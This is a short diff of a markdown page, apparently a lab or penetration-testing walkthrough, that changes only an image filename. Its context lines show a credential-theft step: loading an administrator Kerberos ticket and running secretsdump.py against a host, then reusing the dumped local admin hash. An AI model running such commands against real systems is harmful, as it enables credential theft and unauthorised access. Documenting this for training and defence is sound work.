@@ -760,7 +760,7 @@ export KRB5CCNAME=administrator.ccache
 secretsdump.py -k -no-pass data01.secure.local
 ```
 
-![](<../../../.gitbook/assets/image (1) (1).png>)
+![](<../../../.gitbook/assets/image (1) (1) (2).png>)
 
 16\. We retrieved the hash of the local administrator user. We can use the local admin hash though to authenticate to `DATA01`.&#x20;
 
